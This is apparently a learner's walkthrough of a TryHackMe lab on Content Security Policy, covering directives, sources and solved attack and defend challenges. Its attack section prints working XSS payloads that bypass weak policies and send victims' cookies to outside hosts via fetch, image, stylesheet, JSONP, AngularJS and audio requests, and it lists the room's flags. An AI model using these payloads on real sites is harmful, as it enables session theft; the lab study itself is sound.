<h1 align="center">Content Security Policy</h1>
<p align="center">2025, August 14<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m excited to join you on this adventure, part of my <code>465</code>-day-streak in <a href="https://tryhackme.com">TryHackMe</a>.<br>
<em>In this room you'll learn what CSP is, what it's used for and how to recognize vulnerabilities in a CSP header.</em><br>
<img width="80px" src="https://github.com/user-attachments/assets/d871aa14-a71f-4051-8ce6-0a55c59f0168"><br>
Access this TryHackMe´s walkthrough <a href="https://tryhackme.com/room/csp">here </a>.<br>
<img width="1200px" src=""></p>

<br>

<h2>Task 1 . Introduction</h2>
<p>﻿Welcome to the CSP room! In this room, you'll learn what CSP is, what it's used for, and how to exploit flaws in a flawed CSP configuration. If you don't know what XSS (Cross-site scripting) is, I would recommend checking out the XSS room, as you'll need to have some experience with XSS.</p>

<h3>What is CSP?</h3>
<p>Content Security Policy, or CSP, is a policy usually sent via an HTTP response header from the webserver to your browser when requesting a page that describes which sources of content the browser should allow to be loaded in, and which ones should be blocked. In case an XSS or data injection vulnerability is found in a website, CSP is designed to prevent this vulnerability from being exploited until it's properly patched, and should serve as an extra layer of protection, not as your only line of defense. <br>

A CSP policy can also be included within the page's HTML source code, using the <meta> tag, such as this:<br>
<meta http-equiv="Content-Security-Policy" content="script-src 'none'; object-src 'none';"></p>

<h3>﻿How can CSP be bypassed?</h3>
<p>If you've found an XSS vulnerability in a website, but can't run any unauthorized code, the CSP of the website may be blocking it. What you'll need to do is read the policy sent by the server and see if any flaws in it could be exploited to successfully inject and execute your payload.</p>

<p><em>Answer the questions below</em></p>

<p>1.1. What does CSP stand for?<br>
<code>Content Security Policy</code></p>

<br>

<p>1.2. CSP is designed to add an additional layer of protection against the exploitation of what vulnerability?<br>
<code>XSS</code></p>

<br>

<p>1.3. In which part of the HTTP response does the server usually send the policy to the client?<br>
<code>Header</code></p>

<br>
<br>
<h2>Task 2 . Directives</h2>
<p>The CSP specification contains quite a few directives. In this room, we'll focus on the most popular and important ones, but if you'd like to dive deeper into CSP directives, I'd recommend checking out the MDN page about them.</p>

<h3 = align="center">Some of the more commonly used directives are:</h3>
<p>


- <code>default-src</code> - As the name states, this directive is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.
- <code>script-src</code> - This directive specifies the sources wherefrom JavaScript scripts can be loaded and executed.<br>
- <code>connect-src</code> - This directive specifies to which locations can JavaScript code perform AJAX requests (think XMLHTTPRequest or fetch).<br>
- <code>style-src / img-src / font-src / media-src</code> - These directives specify from which locations CSS stylesheets, images, fonts and media files (audio/video) respectively can be loaded<br>
- <code>frame-src / child-src</code> - This directive defines which locations can be embedded on the webpage via (i)frames.<br>
- <code>report-uri</code> - This is a special directive that will instruct the browser report all violations of your Content Security Policy via a POST request to a particular URL. This is useful if you're trying to find potential code injection vulnerabilities or locations where your CSP may break the functionality of your website. This directive is deprecated and will soon be replaced by the report-to directive, but for now, it remains in use. If you'd like to learn more about it, visit the MDN page for more information.<br></p>


<p>There are also quite a few other directives that I won't be focusing on in this course. If you're interested in the complete list of directives, content-security-policy.com provides this and much more useful information.</p>

<p><em>Answer the questions below</em></p>

<p>2.1. Which directive can we use to restrict the loading of scripts on our website?<br>
<code>script-src</code></p>

<br>

<p>2.2. Which directive can we use to restrict the loading of videos on our website?<br>
<code>media-src</code></p>

<br>

<p>2.3. If we want to log CSP violations, which directive do we need to set to have the browser report violations to us?<br>
<code>report-uri</code></p>

<br>
<h2>Task 3 . Sources</h2>
<h3>Sources</h3>
<p>After a directive in the policy comes a list of sources that specify wherefrom the particular resources are allowed to be loaded. Here are some of the most commonly used sources:<br>

- <code>*</code> - This source is a wildcard, which means content for that specific directive can be loaded from anywhere. It's recommended not to use this source for script-src as it will essentially allow loading scripts from any URL.<br>
- <code>'none'</code> - This is the opposite of the wildcard (*) source as it fully disallows loading resources of the specified directive type from anywhere. For example, if you know you won't be serving certain content on your website, such as music or videos, you can just set the directive to 'none' in your CSP like so: media-src 'none'<br>
- <code>'self'</code> - This source allows you to load resources that are hosted on the same protocol (http/https), hostname (example.com), and port (80/443) as the website. For example, if you're accessing a site such as https://example.com and it has the CSP header set to default-src 'self', you won't be able to load any scripts, images or stylesheets from https://subdomain.example.com, http://example.com or https://example.org.<br>
- <code>'unsafe-inline'</code> - This source allows the use of inline stylesheets, inline JavaScript and event attributes like onclick. This source is considered unsafe and should be avoided.<br>
- <code>'unsafe-eval'</code> - This source allows additional JavaScript code to be executed using functions such as eval() by JS code that's already permitted within the policy. This is usually safe unless a vulnerability is found in the code that runs on the page or the script-src sources are very loose, for example allowing any script to be loaded from a CDN.<br>
- <code>example.com</code> - This source would allow you to load resources from the domain example.com, but not its subdomains<br>
- <code>*.example.com</code> - This source would allow you to load resources from all of the subdomains of example.com, but not the base domain.<br>
- <code>data</code>: - Adding this source to a directive would allow resources to be loaded from a data: url. For script-src, this source is also considered unsafe and should be avoided. Here are some examples of data: urls:<br> <code>data:image/png;base64,iVBORw0KGgo...</code><br><code>data:application/javascript,alert(1337)</code></p>


<p>There's also a couple of special sources, which are usually used in combination with some of the above to ensure only allowed resources are loaded, whilst maintaining convenience for the site owners.<br>

- <code>nonce-</code>: This allows a resource to load if it has a matching nonce attribute. The nonce is a random string that is generated for every request. It is usually used for loading inline JS code or CSS styles. It needs to be unique for every request, as if a nonce is predictable, it can be bypassed.<br>
- For example, if a server sends the following header: <code>script-src 'unsafe-inline' 'nonce-GJYTxu'</code>, the browser will only execute scripts that have the attribute set, like so: <code><script nonce="GJYTxu">alert(1)</script></code><br>
- <code>sha256-</code>: This is simply a SHA256 hash encoded via Base64 used as a checksum to verify that the content of the resource matches up with what's allowed by the server. Currently, <code>sha256</code>, <code>sha384</code>, and <code>sha512</code> are by the CSP standard. This is usually used only for inline JS code or CSS styles but can be used to verify external scripts and/or stylesheets too. We can generate a SHA256 hash of an inline script we're intending to use by using a tool to generate it such as the one at report-uri.com or simply running it on a webpage with a restrictive CSP header and then extracting the hash from the console error.<br>
- For example, if we're looking to run the following JS on our website inline: <code>alert(1337)</code>, we'll need to compute a SHA256 hash. I went ahead and did that, and the hash for the above code would be <code>'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='</code>. Now we can add that to our policy, like so: <code>script-src 'sha256-EKy4VsCHbHLlljt6SkTuD/eXpDbYHR1miZSY8h2DjDc='</code>. Once that's added, the inline script should run as normal.</p>

<p><em>Answer the questions below</em></p>

<p>3.1. If we want to allow script execution via functions such as eval() from already trusted scripts, what source should we allow in our script-src directive?<br>
<code>'unsafe-eval'</code></p>

<br>

<p>3.2. What directive-source combination should we add to our policy if we want to specifically block all JavaScript content from running on our website??<br>
<code>script-src 'none'</code></p>

<br>
<h2>Task 4 . Creating a Content Security Policy</h2>
<p>Now that we've mentioned some of the most commonly used sources, we can talk about how to build your security policy for your website. For a more interactive way of building your policy, I'd recommend report-uri.com's CSP generator as it's a great tool that you can use to experiment with various CSP settings without having to type them out manually. <br><br><br>



When creating a CSP policy, I would recommend setting the default-src directive to 'self'. This ensures all resources by default will only be allowed to load from your website and nowhere else. If all the content (scripts, images, media...) is hosted on your site, this is all you'll need to set. If you load some of the content on your site from external sources (for example, images from a hosting site such as imgur.com), you can adjust the rest of the directives according to your needs.<br>

When setting up the script-src directive and its sources, you should pay special attention to what you're allowing to load. If you're loading a script from an external source such as a CDN, make sure you're specifying the full URL of the script or a nonce/SHA hash of it and not just the hostname where it's hosted at, unless you're 100% sure no scripts that could be used to bypass your policy are hosted there. For example, if you're including jQuery from cdnjs on your website, you should include the full URL of the script (script-src cdnjs.cloudflare.com/ajax/.../jquery.min.js) or the SHA256 hash in your policy. Most CDNs allow you to get the script hash somewhere on their site. For example, on cdnjs, you can get it by clicking "Copy SRI" on the Copy dropdown.</p>

<h3>Inline JS</h3>

<p>If you need to include inline JavaScript or stylesheets in your website, you'll need to set up a nonce generator on the server-side, or compute SHA hashes of your inline scripts and then include them in your policy. There are loads of great libraries for most languages that allow you to do this with minimal effort. For example, if you're working with an Express-based website, I would recommend using the helmet-csp module available on npm, which randomly generates the nonce for you. If you're looking to hash your inline scripts, you can use an online tool such as report-uri.com's hash generator or you can use a tool such as AutoCSP to automatically generate your hashes for you.<br><br>



Note that if you serve JSONP endpoints on your website, you may need to take additional precautions. If you're not sure whether you serve JSONP endpoints or not, you probably don't.</p>

<p><em>Answer the questions below</em></p>

<p>4.1. What hashing algorithm can you use to verify the scripts being loaded? (Without the numbers)<br>
<code>SHA</code></p>

<br>

<p>4.2. Can you include the URLs of the permitted scripts directly in your security policy? (Yes / No)<br>
<code>Yes</code></p>

<br>
<h2>Task 5 . Bypassing a Content Security Policy</h2>
<p>Since we now know how to create content security policies, let's learn how to find bypasses for them.<br>

If you're looking for a quick way to check if your policy has any potential bypass vectors in it, I would recommend using Google's CSP Evaluator. It's able to detect various mistakes in any CSP configuration.</p>

<h3>JSONP endpoints</h3>
<p>﻿Some sites may serve JSONP endpoints which call a JavaScript function in their response. If the callback function of these can be changed, they could be used to bypass the CSP and demonstrate a proof of concept, such as displaying an alert box or potentially even exfiltrating sensitive information from the client such as cookies or authentication tokens. A lot of popular websites serve JSONP endpoints, which can be usually used to bypass a security policy on a website that uses their services. The JSONBee repo lists a good amount of the currently available JSONP endpoints that can be used to bypass a website's security policy.</p>

<h3>Unsafe CSP configurations</h3>
<p>Some sites may allow loading of resources from unsafe sources, for example by allowing data: URIs or using the 'unsafe-inline' source. For example, if a website allows loading scripts from data: URIs, you can simply bypass their policy by moving your payload to the src attribute of the script, like so: <code><script src="data:application/javascript,alert(1)"></script></code>.</p>

<h3>Exfiltration</h3>
<p>﻿To exfiltrate sensitive information, your client needs to connect to a webserver you control. For our purposes, we can use a free service such as Beeceptor to receive the information via the path of the request. If you have access to a paid service such as Burp Collaborator, you can use this instead.<br>

If you prefer running a web server for exfiltration locally, you can set up a simple HTTP server using python by running <code>python -m SimpleHTTPServer</code> or <code>python3 -m http.server</code>.<br>

If the website you're exploiting allows AJAX requests (via connect-src) to anywhere, you can create a fetch request to your server like so:<br>

- <code><script>fetch(`http://example.com/${document.cookie}`)</script></code><br>

When the script is triggered on the victim's machine, you'll see their cookies show up in your access log, like so:<br><br>


<img width="1005" height="166" alt="image" src="https://github.com/user-attachments/assets/6c965f4b-559e-450b-828c-1e4baac99569" /><br><br>

If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the <code>connect-src</code> policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.<br><br>

<img width="1012" height="47" alt="image" src="https://github.com/user-attachments/assets/0c03034b-feb6-4cd4-b27a-0e79fb3b043a" />


<p><em>Answer the question below</em></p>

<p>5.1. If Ajax/XHR requests are blocked, can we still exfiltrate sensitive information? (Yes / No)<br>
<code>Yes</code></p>

<br>
<h2>Task 6 . CSP Sandbox</h2>
<p>Time to put your practice to test! I've created a VM that is intentionally vulnerable to XSS but uses various content security policies to mitigate it. You should be able to test what you've learned so far. It consists of 10 challenges, 7 of which are attack and 3 are defend, and also a playground where you can test your own CSP configurations.<br><br>

[ Start Machine ]<br><br>

You can access the introduction at http://xx.xxx.xxx.xxx/. </p>

<p><em>Answer the question below</em></p>

<p>5.1. I have deployed the CSP Sandbox machine.<br>
<code>Yes</code></p>

<br>
<h2>Task 7 . CSP Sandbox :: Attack challenges</h2>
<p>To deploy the machine, go to the <strong>CSP Sandbox</strong> task.<br><br>

<strong>Attack</strong> challenges require you to bypass the CSP header sent by the webpage and exfiltrate the administrator's cookies. For methods on how you can achieve this, refer to the Bypassing CSP task of this room.<br><br>

<em>For verification, all challenges are accessed by a bot locally (localhost)</em>.</p>

<p><em>Answer the questiona below</em></p>

<p>7.1. Flag for attack-1<br>
<code>THM{Th4t_W4s_Pr3tty_3asy}</code></p>

<p>

- navigated to <code>xx.xxx.xxx.xxx:30001</code><br><br><img width="1250" height="787" alt="image" src="https://github.com/user-attachments/assets/789a62ae-0845-4312-b4ec-decfc28d791c" /><br><br>
- navigated to <code>https://csp-evaluator.withgoogle.com</code> to check if the policy has any potential bypass vectors in it<br>
- pasted <code>xx.xxx.xxx.xxx:30001</code><br>
- clicked <code>CHECK CSP</code><br>
- identified that there is <code>default-src</code>:<br> <code>*</code> and<br><code>‘unsafe-inline’</code><br>
- checked and identified that the directive <code>default-src</code><br> is used as the default, which means if a certain resource is trying to be loaded and there isn't a directive specified for its type, it falls back to default-src to verify if it's allowed to load.<br>
- set up an http.server<br>
- typed a payload <code><script>fetch(`http://xx.xxx.xx.xxx:8000/${document.cookie}`)</script></code><br>
- clicked <code>Submit Query</code><br>
- received the flag and URL decoded it: <code>THM%7BTh4t_W4s_Pr3tty_3asy%7D</code> = <code>THM{Th4t_W4s_Pr3tty_3asy}</code></p>

<br>
<br>

<img width="1253" height="700" alt="image" src="https://github.com/user-attachments/assets/74a6a4ef-47ad-4a1d-ac37-ad50e1b357e2" />

<br>
<br>

<img width="921" height="103" alt="image" src="https://github.com/user-attachments/assets/41448af8-883f-4178-bcb3-91e12838b414" />

<br>
<br>

<img width="1084" height="116" alt="image" src="https://github.com/user-attachments/assets/bafc9f16-ba1f-4409-9785-2812fe8a8bd4" />

<br>
<br>
<br>
<p>7.2. Flag for attack-2<br>
<code>THM{Us1ng_data:_1snt_Any_S4fer}</code></p>

<br>

<img width="1353" height="198" alt="image" src="https://github.com/user-attachments/assets/67f13b29-2eb5-4699-82b0-d6d15e495dd5" />


<br>
<br>

```bash
fetch(`https://randomcsp.free.beeceptor.com/${document.cookie}`)
```

<br>
<p><em>CyberChef > To Base64</em></p>

```bash
ZmV0Y2goYGh0dHBzOi8vcmFuZG9tY3NwLmZyZWUuYmVlY2VwdG9yLmNvbS8ke2RvY3VtZW50LmNvb2tpZX1gKQ==
```

<br>
<p><em>Payload</em></p>

```bash
script src="data:;base64,ZmV0Y2goYGh0dHBzOi8vcmFuZG9tY3NwLmZyZWUuYmVlY2VwdG9yLmNvbS8ke2RvY3VtZW50LmNvb2tpZX1gKQ=="></script>
```

<br>

<img width="1087" height="166" alt="image" src="https://github.com/user-attachments/assets/671ed009-b347-4bbe-b365-6164fb3c9efd" />

<br>
<br>


<img width="1356" height="206" alt="image" src="https://github.com/user-attachments/assets/56b11d55-c5e9-4d86-abce-9cc770b317b6" />

<br>
<br>
<br>
<p>7.3. Flag for attack-3<br>
<code>THM{Th4ts_N0t_4n_1m4ge!!}</code></p>

<br>

<img width="1162" height="409" alt="image" src="https://github.com/user-attachments/assets/331711e2-9423-460e-ac84-1ec82e7b3644" />


<br>
<br>
<p><em>Payload</em></p>

```bash
<img id="researcher" src=""> <script>document.getElementById('researcher').src="http://xx.xxx.xx.xxx:8000/" + document.cookie;</script>
```

<br>
<br>

<img width="1094" height="156" alt="image" src="https://github.com/user-attachments/assets/230f2030-5bb1-4a82-9d84-77046bc369c3" />

<br>
<br>

<img width="1358" height="186" alt="image" src="https://github.com/user-attachments/assets/91f5c55f-7e0e-4e56-ad42-1693645a03ea" />

<br>
<br>
<br>
<p>7.4. Flag for attack-4<br>
<code>THM{Style_Y0ur_W3bs1teS}</code></p>

<p><em>researcher.beeceptor.com</em></p>
<br>

<img width="1125" height="428" alt="image" src="https://github.com/user-attachments/assets/f09cd883-c2dd-4cfc-ab76-c620c40a1bd6" />

<br>

<p><em>CSP Evaluator</em></p>
<br>

```bash
Content-Security-Policy: default-src 'none'; style-src * 'self'; script-src 'nonce-abcdef'
```

<br>

<img width="1086" height="424" alt="image" src="https://github.com/user-attachments/assets/2dae1bdf-9ad3-4f21-bf2c-360f37d3e630" />

<br>
<p><em>payload</em></p>

```bash
<link id="researcher" rel=stylesheet href="" /><script nonce="abcdef">document.getElementById('researcher').href="https://researcher.free.beeceptor.com/" + document.cookie;</script>
```

<br>

<p><em>researcher.beeceptor.com</em></p>

```bash
 GET /flag=THM%7BStyle_Y0ur_W3bs1teS%7D
```

<br>
<br>
<br>
<p>7.5. Flag for attack-5<br>
<code>THM{N0_JSONP_D0mains_Plz}</code></p>

<p><em>CSP Evaluator</em></p>
<br>

```bash
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src *; script-src 'unsafe-eval' *.google.com
```

<br>

<img width="1112" height="425" alt="image" src="https://github.com/user-attachments/assets/50021b52-32c1-4d96-9c27-b0bb0abf20d7" />


<br>
<p><em>payload</em></p>

```bash
<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(document.location='https://researcher.free.beeceptor.com/'.concat(document.cookie))"></script>
```

<br>

<p><em>researcher.beeceptor.com</em></p>
<br>

<img width="391" height="288" alt="image" src="https://github.com/user-attachments/assets/0c0efa26-46ad-4717-83c9-21284e5117d6" />

<br>

```bash
GET `/flag=THM%7BN0_JSONP_D0mains_Plz%7D`
```
<br>
<br>
<br>
<p>7.6. Flag for attack-6<br>
<code>THM{Trust_N0_CDN}</code></p>

<p><em>CSP Evaluator</em></p>
<br>

```bash
Content-Security-Policy: default-src 'none'; img-src *; style-src 'self'; script-src 'unsafe-eval' cdnjs.cloudflare.com
```

<br>
<br>

<img width="1105" height="401" alt="image" src="https://github.com/user-attachments/assets/6cc66344-7318-45c3-8f1b-14828160ee0b" />

<br>
<br>
<p><em>payload</em></p>

```bash
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js" integrity="sha512-C4LuwXQtQOF1iTRy3zwClYLsLgFLlG8nCV5dCxDjPcWsyFelQXzi3efHRjptsOzbHwwnXC3ZU+sWUh1gmxaTBA==" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.2/angular.min.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().document.location='https://researcher.free.beeceptor.com/' + $on.curry.call().document.cookie}}
</div>
```

<br>

<p><em>researcher.beeceptor.com</em></p>
<br>

<img width="406" height="409" alt="image" src="https://github.com/user-attachments/assets/e4ae928b-dc57-4308-be55-1f0b915aa7e2" />

<br>
<br>

```bash
GET `/flag=THM%7BTrust_N0_CDN%7D`
```

<br>
<br>
<br>
<p>7.7. Flag for attack-7. Hint : The 404 error looks kinda weird...<br>
<code>THM{Th1s_4udio_S0unds_N1ce}</code></p>
<br>
<p><em>CSP Evaluator</em></p>
<br>

```bash
Content-Security-Policy: default-src 'none'; media-src *; style-src 'self'; script-src 'self'
```

<br>
<br>

<img width="1109" height="400" alt="image" src="https://github.com/user-attachments/assets/95bf664c-cc4b-4c27-8112-3a023f281065" />


<br>
<p><em>payload</em></p>

```bash
<script src="/'; new Audio('https://researcher.free.beeceptor.com/'+document.cookie);'"></script>
```

<br>

<p><em>researcher.beeceptor.com</em></p>
<br>
<br>

<img width="418" height="252" alt="image" src="https://github.com/user-attachments/assets/67a69c19-5495-48ec-840f-977656012e69" />


<br>
<br>

```bash
GET `/flag=THM%7BTh1s_4udio_S0unds_N1ce%7D`
```

<br>
<br>
<br>
<h2>Task 8 . CSP Sandbox :: Defend Challenges</h2>
<p>To deploy the machine, go to the <strong>CSP Sandbox</strong> task.<br><br>

<strong>Defend</strong> challenges require you to defend the website from XSS attacks by creating a CSP header that blocks them, whilst allowing the legitimate scripts to execute.</p>

<p><em>Answer the question below</em></p>

<p>8.1. What is the flag for defend-1?<br>
<code>THM{N0_0utside_S0urces}</code></p>

<br>

<img width="1119" height="138" alt="image" src="https://github.com/user-attachments/assets/477f32dc-a403-449a-9194-661818c7b6dd" />

<br>
<br>

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 615
ETag: W/"267-BP86b/pS4qwW5ko90IpiLspvqsM"
Date: T...
```

<br>

<p><em>View Source</em><br>
http://xxx.xx.xxx.xxx:3008</p>

<br>

```bash
 <script src="/defend-1.js"></script>
```

<br>
<br>

<img width="1123" height="227" alt="image" src="https://github.com/user-attachments/assets/d8d73d52-6b50-4dbc-8ecc-0a1f88d6e62e" />

<br>
<p><em>payload</em></p>

```bash
script-src 'self';
```

<br>
<br>

<img width="1120" height="163" alt="image" src="https://github.com/user-attachments/assets/26be0d11-132d-42b7-9d0b-3079fb707eea" />


<br>
<br>
<br>
<p>8.2. What is the flag for defend-2?<br>
<code>THM{M4k3_Sure_Y0ur_N0nce_1s_R4ndom}</code></p>

<br>
<br>

<img width="1111" height="156" alt="image" src="https://github.com/user-attachments/assets/809cdda1-745c-4765-8d41-4b79e809aeab" />

<br>
<br>

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 615
ETag: W/"267-BP86b/pS4qwW5ko90IpiLspvqsM"
Date: T...
```

<br>

<p><em>View Source</em><br>
http://xxx.xx.xxx.xxx:3009</p>

<br>

```bash
<script nonce="ae3b00">defend2Real=true;console.log("__defend-2_REAL="+defend2Real)</script>
```

<br>
<br>

<img width="1106" height="425" alt="image" src="https://github.com/user-attachments/assets/f3641ab2-610c-4646-9a9d-daa706c50ed0" />

<br>
<br>
<p><em>payload</em></p>

```bash
script-src 'nonce-ae3b00'
```

<br>
<br>

<img width="1116" height="172" alt="image" src="https://github.com/user-attachments/assets/25ca63d9-821f-4234-b3b2-d205224527f6" />

<br>
<br>
<br>
<p>8.3. What is the flag for defend-3?<br>
<code>THM{Hash_Y0ur_1nl1ne_Scr1pts}</code></p>
<br>
<br>

<img width="1109" height="115" alt="image" src="https://github.com/user-attachments/assets/f57647ab-2bf4-44e2-a1a1-659096622d62" />

<br>
<br>

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 575
ETag:  W/"320-hSI+j9+cvNsDURMubb8nm4rStRY"
Date: ...
```

<br>

<p><em>View Page Source</em><br>
http://xxx.xx.xxx.xxx:3009</p>

<br>

```bash
<script>console.log("__defend-3_REAL=true")</script>
```

<br>
<br>

<img width="1116" height="241" alt="image" src="https://github.com/user-attachments/assets/cc9510bd-0ebc-49cd-9ea9-61d6ef4e3e4e" />

<br>
<br>

<p><em>Report URI</em><br>
https://report-uri.com/home/hash</p>

<br>
<br>

```bash
console.log("__defend-3_REAL=true")
```

<br>
<br>

<img width="1109" height="287" alt="image" src="https://github.com/user-attachments/assets/680b40c1-268c-4ff0-9560-7b226f3857b7" />

<br>
<br>

<img width="1122" height="358" alt="image" src="https://github.com/user-attachments/assets/e89ad6eb-019b-4a82-a6a9-5a15fc7ecda1" />

<br>
<br>

```bash
'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='
```

<br>

<br>
<p><em>payload</em></p>

```bash
script-src 'sha256-8gQ3l0jVGr5ZXaOeym+1jciekP8wsfNgpZImdHthDRo='
```

<br>
<br>

<img width="1118" height="149" alt="image" src="https://github.com/user-attachments/assets/40a1eea1-7197-447e-b3f4-80258e793328" />

<br>
<br>

<img width="1118" height="295" alt="image" src="https://github.com/user-attachments/assets/9a3044d7-04d7-45b6-b5be-e7ec157fdb64" />

<br>
<br>


<br>
<br>
